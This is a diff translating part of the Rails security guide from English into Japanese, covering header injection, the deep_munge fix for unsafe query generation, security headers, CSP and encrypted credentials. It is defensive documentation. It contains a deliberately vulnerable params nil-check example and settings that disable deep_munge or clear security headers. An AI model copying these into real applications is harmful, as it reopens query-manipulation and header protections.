-Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can't rely on this. _In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks._
+特定の条件下で、この邪悪なHTMLが標的ユーザーのブラウザで表示されることがあります。ただし、おそらくKeep-Alive接続が有効になっていないとこの攻撃は効かないでしょう。多くのブラウザはワンタイム接続を使っているからです。かといって、Keep-Aliveが無効になっていることを当てにするわけにはいきません。**これはいずれにしろ重大なバグであり、ヘッダーインジェクションとレスポンス分割の可能性を排除するため、Railsを2.0.5または2.1.2にアップグレードする必要があります**。
 
-Unsafe Query Generation
+安全でないクエリ生成
 -----------------------
 
-Due to the way Active Record interprets parameters in combination with the way
-that Rack parses query parameters it was possible to issue unexpected database
-queries with `IS NULL` where clauses. As a response to that security issue
-([CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ),
-[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ)
-and [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ))
-`deep_munge` method was introduced as a solution to keep Rails secure by default.
+Rackがクエリパラメータを解析(parse)する方法とActive Recordがパラメータを解釈する方法の組み合わせに問題があり、where句が`IS NULL`のデータベースクエリを本来の意図に反して生成することが可能になってしまっています。([CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ)、[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ) および [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)) のセキュリティ問題への対応として、Railsの動作をデフォルトでセキュアにするために`deep_munge`メソッドが導入されました。
 
-Example of vulnerable code that could be used by attacker, if `deep_munge`
-wasn't performed is:
+以下は、`deep_munge`が実行されなかった場合に攻撃者に利用される可能性のある脆弱なコードの例です。
 
 ```ruby
 unless params[:token].nil?
@@ -989,13 +943,9 @@ unless params[:token].nil?
 end
 ```
 
-When `params[:token]` is one of: `[nil]`, `[nil, nil, ...]` or
-`['foo', nil]` it will bypass the test for `nil`, but `IS NULL` or
-`IN ('foo', NULL)` where clauses still will be added to the SQL query.
+`params[:token]`が`[nil]`、`[nil, nil, ...]`、`['foo', nil]`のいずれかの場合、`nil`チェックをパスするにもかかわらず、where句が`IS NULL`または`IN ('foo', NULL)`になってSQLクエリに追加されてしまいます。
 
-To keep Rails secure by default, `deep_munge` replaces some of the values with
-`nil`. Below table shows what the parameters look like based on `JSON` sent in
-request:
+Railsをデフォルトでセキュアにするために、`deep_munge`メソッドは一部の値を`nil`に置き換えます。リクエストで送信された`JSON`ベースのパラメータがどのように見えるかを以下の表に示します。
 
 | JSON                              | Parameters               |
 |-----------------------------------|--------------------------|
@@ -1005,17 +955,16 @@ request:
 | `{ "person": [null, null, ...] }` | `{ :person => [] }`     |
 | `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |
 
-It is possible to return to old behavior and disable `deep_munge` configuring
-your application if you are aware of the risk and know how to handle it:
+リスクと取扱い上の注意を十分理解している場合に限り、`deep_munge`をオフにしてアプリケーションを従来の動作に戻すことができます。
 
 ```ruby
 config.action_dispatch.perform_deep_munge = false
 ```
 
-Default Headers
+デフォルトのヘッダー
 ---------------
 
-Every HTTP response from your Rails application receives the following default security headers.
+Railsアプリケーションから受け取るすべてのHTTPレスポンスには、以下のセキュリティヘッダーがデフォルトで含まれています。
 
 ```ruby
 config.action_dispatch.default_headers = {
@@ -1028,7 +977,7 @@ config.action_dispatch.default_headers = {
 }
 ```
 
-You can configure default headers in `config/application.rb`.
+デフォルトのヘッダー設定は`config/application.rb`で変更できます。
 
 ```ruby
 config.action_dispatch.default_headers = {
@@ -1037,30 +986,26 @@ config.action_dispatch.default_headers = {
 }
 ```
 
-Or you can remove them.
+以下のようにヘッダーを除去することもできます。
 
 ```ruby
 config.action_dispatch.default_headers.clear
 ```
 
-Here is a list of common headers:
+よく使われるヘッダーのリストを以下に示します。
 
-* **X-Frame-Options:** _'SAMEORIGIN' in Rails by default_ - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' if you want to allow framing for all website.
-* **X-XSS-Protection:** _'1; mode=block' in Rails by default_ - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off(useful if response contents scripts from request parameters)
-* **X-Content-Type-Options:** _'nosniff' in Rails by default_ - stops the browser from guessing the MIME type of a file.
-* **X-Content-Security-Policy:** [A powerful mechanism for controlling which sites certain content types can be loaded from](http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html)
-* **Access-Control-Allow-Origin:** Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
-* **Strict-Transport-Security:** [Used to control if the browser is allowed to only access a site over a secure connection](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)
+* `X-Frame-Options`: **Railsではデフォルトで'SAMEORIGIN'が指定されます**。このヘッダーは、同一ドメインでのフレーミングを許可します。'DENY'を指定するとすべてのフレーミングが不許可になります。すべてのWebサイトについてフレーミングを許可するには'ALLOWALL'を指定します。
+* `X-XSS-Protection`: **Railsではデフォルトで'1; mode=block'が指定されます**。XSS攻撃が検出された場合は、XSS Auditorとブロックページをお使いください。XSS Auditorをオフにしたい場合は'0;'を指定します(レスポンスがリクエストパラメータからのスクリプトを含んでいる場合に便利です)。
+* `X-Content-Type-Options`: **'nosniff'はRailsではデフォルトです**。このヘッダーは、ブラウザがファイルのMIMEタイプを推測しないようにします。
+* `X-Content-Security-Policy`: このヘッダーは、[コンテンツタイプを読み込む元のサイトを制御するための強力なメカニズム](http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html)です。
+* `Access-Control-Allow-Origin`: このヘッダーは、同一生成元ポリシーのバイパスとクロスオリジン(cross-origin)リクエストをサイトごとに許可します。
+* `Strict-Transport-Security`: このヘッダーは、[ブラウザからサイトへの接続をセキュアなものに限って許可するかどうかを指定します](https://ja.wikipedia.org/wiki/HTTP_Strict_Transport_Security)。
 
-### Content Security Policy
+### Content Security Policy（CSP）
 
-Rails provides a DSL that allows you to configure a
-[Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
-for your application. You can configure a global default policy and then
-override it on a per-resource basis and even use lambdas to inject per-request
-values into the header such as account subdomains in a multi-tenant application.
+Railsでは、アプリケーションで[Content Security Policy](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy)（CSP）を設定するためのDSLが提供されています。グローバルなデフォルトポリシーを設定し、それをリソースごとにオーバーライドすることも、lambdaを用いてリクエストごとに値をヘッダーに注入することもできます（マルチテナントのアプリケーションにおけるアカウントのサブドメインなど）。
 
-Example global policy:
+以下はグローバルなポリシーの例です。
 
 ```ruby
 # config/initializers/content_security_policy.rb
@@ -1071,47 +1016,39 @@ Rails.application.config.content_security_policy do |policy|
   policy.object_src  :none
   policy.script_src  :self, :https
   policy.style_src   :self, :https
-
-  # Specify URI for violation reports
+  # 違反レポートの対象URIを指定する
   policy.report_uri "/csp-violation-report-endpoint"
 end
 ```
 
-Example controller overrides:
+以下はコントローラでオーバーライドするコード例です。
 
 ```ruby
-# Override policy inline
+# ポリシーをインラインでオーバーライドする場合
 class PostsController < ApplicationController
   content_security_policy do |p|
     p.upgrade_insecure_requests true
   end
 end
-
-# Using literal values
+# リテラル値を使う場合
 class PostsController < ApplicationController
   content_security_policy do |p|
     p.base_uri "https://www.example.com"
   end
 end
-
-# Using mixed static and dynamic values
+# 静的値と動的値を両方使う場合
 class PostsController < ApplicationController
   content_security_policy do |p|
     p.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
   end
 end
-
-# Disabling the global CSP
+# グローバルCSPをオフにする場合
 class LegacyPagesController < ApplicationController
   content_security_policy false, only: :index
 end
 ```
 
-Use the `content_security_policy_report_only`
-configuration attribute to set
-[Content-Security-Policy-Report-Only](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only)
-in order to report only content violations for migrating
-legacy content
+レガシーなコンテンツを移行するときにコンテンツの違反だけをレポートしたい場合は、設定で`content_security_policy_report_only`属性を用いて[Content-Security-Policy-Report-Only](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only)を設定します。
 
 ```ruby
 # config/initializers/content_security_policy.rb
@@ -1119,25 +1056,23 @@ Rails.application.config.content_security_policy_report_only = true
 ```
 
 ```ruby
-# Controller override
+# コントローラでオーバーライドする場合
 class PostsController < ApplicationController
   content_security_policy_report_only only: :index
 end
 ```
 
-You can enable automatic nonce generation:
+以下の方法でnonceの自動生成を有効にできます。
 
 ```ruby
 # config/initializers/content_security_policy.rb
 Rails.application.config.content_security_policy do |policy|
   policy.script_src :self, :https
 end
-
 Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
 ```
 
-Then you can add an automatic nonce value by passing `nonce: true`
-as part of `html_options`. Example:
+後は以下のように`html_options`の中で`nonce: true`を渡せばnonce値が自動的に追加されます。
 
 ```html+erb
 <%= javascript_tag nonce: true do -%>
@@ -1145,15 +1080,13 @@ as part of `html_options`. Example:
 <% end -%>
 ```
 
-The same works with `javascript_include_tag`:
+`javascript_include_tag`でも同じことができます。
 
 ```html+erb
 <%= javascript_include_tag "script", nonce: true %>
 ```
 
-Use [`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)
-helper to create a meta tag "csp-nonce" with the per-session nonce value
-for allowing inline `<script>` tags.
+セッションごとにインライン`<script>`タグを許可するnonce値を含むcsp-nonceメタタグを生成するには、[`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)ヘルパーをお使いください。
 
 ```html+erb
 <head>
@@ -1161,54 +1094,49 @@ for allowing inline `<script>` tags.
 </head>
 ```
 
-This is used by the Rails UJS helper to create dynamically
-loaded inline `<script>` elements.
+これは、動的に読み込まれるインライン`<script>`要素をRails UJSヘルパーが生成するのに使われます。
 
-Environmental Security
+利用環境のセキュリティ
 ----------------------
 
-It is beyond the scope of this guide to inform you on how to secure your application code and environments. However, please secure your database configuration, e.g. `config/database.yml`, master key for `credentials.yml`, and other unencrypted secrets. You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.
+アプリケーションのコードや実行環境をセキュアにする方法については、本ガイドの範疇を超えます。ただし、`config/database.yml`などに置かれるデータベース接続設定のセキュリティや、`config/secrets.yml`などに置かれるサーバーサイドの秘密鍵のセキュリティは保つようにしてください。これらのファイルや、その他重要な情報を含む可能性のあるファイルを、環境に合わせて複数のバージョンを使い分けることで、さらにアクセス制限をかけられます。
 
-### Custom credentials
+### 独自のcredential
 
-Rails stores secrets in `config/credentials.yml.enc`, which is encrypted and hence cannot be edited directly. Rails uses `config/master.key` or alternatively looks for environment variable `ENV["RAILS_MASTER_KEY"]` to encrypt the credentials file. The credentials file can be stored in version control, as long as master key is kept safe.
+Railsはcredentialファイル`config/credentials.yml.enc`に秘密鍵を保存します。このファイルは暗号化されているため直接編集することはできません。Railsはcredentialファイルを暗号化するためのマスターキーに`config/master.key`か環境変数`ENV["RAILS_MASTER_KEY"]`を使用します。credentialファイルは、マスターキーが安全に保存されている場合に限り、バージョン管理システムに登録することができます。
 
-To add new secret to credentials, first run `rails secret` to get a new secret. Then run `rails credentials:edit` to edit credentials, and add the secret. Running `credentials:edit` creates new credentials file and master key, if they did not already exist.
+新しい秘密鍵をcredentialファイルに追加するには、まず`rails secret`を実行して新しい秘密鍵を生成し、続いて`rails credentials:edit`でcredentialを編集して秘密鍵を追加します。`credentials:edit`を実行すると、credentialファイルとマスターキーがまだ存在してなければ新たに作成します。
 
-By default, this file contains the application's
-`secret_key_base`, but it could also be used to store other credentials such as access keys for external APIs.
+このファイルには、アプリケーションの`secret_key_base`がデフォルトで含まれますが、外部API向けのアクセスキーなどのcredentialを含めることもできます。
 
-The secrets kept in credentials file are accessible via `Rails.application.credentials`.
-For example, with the following decrypted `config/credentials.yml.enc`:
+credentialファイル内の秘密情報には`Rails.application.credentials`でアクセスできます。たとえば、復号した`config/credentials.yml.enc`ファイルに以下があるとします。
 
     secret_key_base: 3b7cd727ee24e8444053437c36cc66c3
     some_api_key: SOMEKEY
 
-`Rails.application.credentials.some_api_key` returns `SOMEKEY` in any environment.
+どの環境でも`Rails.application.credentials.some_api_key`から`SOMEKEY`が返されます。
 
-If you want an exception to be raised when some key is blank, use the bang
-version:
+キーが空の場合に例外を発生させるには、`!`を付けます。
 
 ```ruby
 Rails.application.credentials.some_api_key! # => raises KeyError: :some_api_key is blank
 ```
 
+TIP: credentialについて詳しくは、`rails credentials:help`を参照してください。
 
-TIP: Learn more about credentials with `rails credentials:help`.
+WARNING: マスターキーは安全な場所に保管してください。マスターキーをコミットに含めてはいけません。
 
-WARNING: Keep your master key safe. Do not commit your master key.
-
-Dependency Management and CVEs
+依存関係の管理とCVEについて
 ------------------------------
 
-We don’t bump dependencies just to encourage use of new versions, including for security issues. This is because application owners need to manually update their gems regardless of our efforts. Use `bundle update --conservative gem_name` to safely update vulnerable dependencies.
+私たちは、（セキュリティ問題も含め）新しいバージョンの利用を推進するためだけの理由で依存関係を変更することはありません。その理由は、私たちのセキュリティに関する努力とは別に、アプリケーションのオーナーが手動でgemを更新する必要があるためです。脆弱な依存関係を安全に更新するには、`bundle update --conservative gem_name`をお使いください。
 
-Additional Resources
+追加資料
 --------------------
 
-The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:
+激しく移り変わるセキュリティの動向に常に目を配り、最新の情報を入手するようにしてください。新しく登場した脆弱性を見逃すと、壊滅的な損害をこうむる可能性があります。Railsのセキュリティ関連の追加リソースをご紹介します。
 
-* Subscribe to the Rails security [mailing list](https://groups.google.com/forum/#!forum/rubyonrails-security).
-* [Brakeman - Rails Security Scanner](https://brakemanscanner.org/) - To perform static security analysis for Rails applications.
-* [Keep up to date on the other application layers](http://secunia.com/) (they have a weekly newsletter, too).
-* A [good security blog](https://www.owasp.org) including the [Cross-Site scripting Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
+* Railsセキュリティ [メーリングリスト](https://groups.google.com/forum/#!forum/rubyonrails-security))を購読しましょう。
+* [Brakeman - Rails Security Scanner](https://brakemanscanner.org/) -- Railsアプリケーションの静的セキュリティ解析を行うgemです。
+* [アプリケーションのその他の層についても最新に保ってください](http://secunia.com/) (週刊のニュースレターも発行しています)。
+* ある[優れたセキュリティブログ](https://www.owasp.org)には[クロスサイトスクリプティングのチートシート](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)が掲載されています。
